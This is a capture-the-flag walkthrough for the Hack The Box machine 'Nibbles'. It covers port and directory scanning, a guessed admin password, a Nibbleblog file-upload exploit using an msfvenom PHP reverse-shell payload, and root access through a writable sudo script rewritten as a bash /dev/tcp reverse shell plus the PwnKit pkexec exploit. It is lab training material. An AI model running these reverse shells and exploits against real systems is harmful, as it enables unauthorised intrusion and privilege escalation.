# Box: Nibbles
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.129.96.84 -v -p- -T4```

```
Nmap scan report for 10.129.96.84
Host is up (0.12s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp    open     http          Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/27%OT=22%CT=1%CU=41896%PV=Y%DS=2%DC=T%G=Y%TM=658BD4
OS:45%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=107%GCD=1%ISR=10C%TI=Z%CI=RI%II=I%TS=8)OPS(O1=M53CST11NW7%O2=M53CST
OS:11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7
OS:120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M
OS:53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 0.012 days (since Wed Dec 27 08:20:20 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   135.60 ms 10.10.14.1
2   136.62 ms 10.129.96.84

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 27 08:37:41 2023 -- 1 IP address (1 host up) scanned in 1156.08 seconds
```
From our nmap scan we have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on the port running the http service


# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8aaf187d-dd8e-489e-8963-ad9ff6b31044)

cool, we got the "Hello World!" message. Checking the page source, you should get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ffe52ad2-3479-4c3c-b890-aa9672b36211)

We can see the directory ```/nibbleblog``` in the html comment located in the page source

Navigating to that directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb97d27c-a32c-4140-a85e-c095e6984d00)

We have this webpage running on the Nibbleblog CMS (content management system).

Lets fuzz for directories using ffuf

command:```ffuf -u "http://10.129.96.84/nibbleblog/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup,.xml```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/bashed]
└─$ ffuf -u "http://10.129.96.84/nibbleblog/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup,.xml

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.84/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup .xml 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 213ms]
    * FUZZ: admin

[Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 215ms]
    * FUZZ: admin.php

[Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 225ms]
    * FUZZ: admin.php

[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 220ms]
    * FUZZ: content

[Status: 200, Size: 302, Words: 8, Lines: 8, Duration: 291ms]
    * FUZZ: feed.php

[Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 1784ms]
    * FUZZ: index.php

[Status: 200, Size: 78, Words: 11, Lines: 1, Duration: 222ms]
    * FUZZ: install.php

[Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 4209ms]
    * FUZZ: index.php

[Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 143ms]
    * FUZZ: languages

[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 226ms]
    * FUZZ: plugins

[Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 221ms]
    * FUZZ: README

[Status: 200, Size: 402, Words: 33, Lines: 11, Duration: 221ms]
    * FUZZ: sitemap.php

[Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 218ms]
    * FUZZ: themes

[Status: 200, Size: 1622, Words: 103, Lines: 88, Duration: 215ms]
    * FUZZ: update.php

:: Progress: [36912/36912] :: Job [1/1] :: 107 req/sec :: Duration: [0:03:45] :: Errors: 0 ::
```
We have quite a number of directories actually. 

Well, lets navigate to the ```/content``` directory, you'll find something interesting there actually

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b7985347-0556-4a32-ae6b-8d7d96b867b7)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/be27cf74-4289-4a89-8090-459728a142ad)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c1e9e397-7606-4723-b58d-f99ac49a59d3)

Alright, so we found a username ```admin```. Finding a username means there's a login page.

When we fuzzed earlier we found the directory ```/admin.php```, lets navigate here

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3747ac24-2ee6-4bd0-b810-8c379482e226)

Apparently, the password is actually the name of the box😂

username:```admin```                  password:```nibbles```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86058e52-f457-4052-ad93-e9aa27b56084)

We are logged in🙃

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ccac2939-f446-420d-9200-d0cd1c30601d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e06882d-1432-4f28-8c9a-bb65f76057c4)

We can see the version of Nibbleblog to be ```4.0.3```. Apparently, there's a public exploit for this😎. Lets go ahead and exploit this




# Exploitation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a8afbc86-2aa8-4bbd-ba45-0c0a64fe311b)

You can download the exploit from [here](https://github.com/TheRealHetfield/exploits/blob/master/nibbleBlog_fileUpload.py)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/653fcf18-6e58-4c98-aa4c-0da3f27544ca)

As you can see from the above screenshot, the exploit requires us to generate a payload into the file ```nibble.txt```

command:```msfvenom -p php/reverse_perl --format raw -o nibble.txt LHOST=10.10.14.71 LPORT=1234```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/nibbles]
└─$ msfvenom -p php/reverse_perl --format raw -o nibble.txt LHOST=10.10.14.71 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1921 bytes
Saved as: nibble.txt
```
Now that we are done with this, lets change some parameters in the exploit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b7e9d8dd-bb8b-4c2f-9e12-0ef80434f87f)

We can now save the exploit. Ensure you have your netcat listener ready before running the command

command:```python2 nibbleBlog_fileUpload.py```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8ba92ff-02c8-4a6c-aa05-65c34595c81c)

cool, we spawned a user shell🙃.

Lets stabilize the shell

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f2ce17f-f4f2-4ef3-81e9-e5c1c5f443af)

Lets go ahead and escalate our privileges




# Privilege Escalation

Running the ```sudo -l``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/54f0dc73-1c81-4e73-b29d-d27e14912b90)

We see that the user ```nibbler``` can run the ```monitor.sh``` script as root

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e1eb1229-6592-4770-a07b-b53f3843f75d)

What I did in the above screenshot was to unzip the ```personal.zip``` file so I can gain access to the ```monitor.sh``` script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1a888e2b-6f7f-4a2a-9c40-c4379e1e0846)

You can see the permissions we have for the file, so we have read, write and execute permissions.

Well, lets change the content of the script to this

```bash
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.71/1337 0>&1'
```
The content of the ```monitor.sh``` script is quite much, since we don't have time to delete all, we can just do this

commands
```
echo "null" > monitor.sh
nano monitor.sh
```
Then you paste the script I provided above and then save the file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb6acb11-559d-4b05-830e-17276ea6f9e1)

Now lets run this with sudo privileges

command:```sudo -u root /home/nibbler/personal/stuff/monitor.sh```

Ensure your netcat listener is set up

Running the command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/80b8e199-0ea4-4906-b578-a39fc8459fb7)

cool, we spawned root shell😎

Well, lets take a look at an unintended way to get root access

# Unintended Method to get root access

Lets start out by searching for suid binaries

command:```find / -perm -u=s -type f 2>/dev/null```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d324ad30-f592-4fc2-8319-4645d505c89b)

We have the suid binary ```pkexec```. Lets try the pwnkit exploit for this

You can downlod the exploit from [here](https://github.com/ly4k/PwnKit/blob/main/PwnKit.c)

Send this over to the target machine and compile

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c354deb-c2ed-434f-890d-22b48d424389)

To compile and run

command
```
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/56ce4587-98cc-4ca7-96c9-056aaf20707d)

We spawned a shell as root user😅


That will be all for today
<br><br>
[Back To Home](../../index.md)




























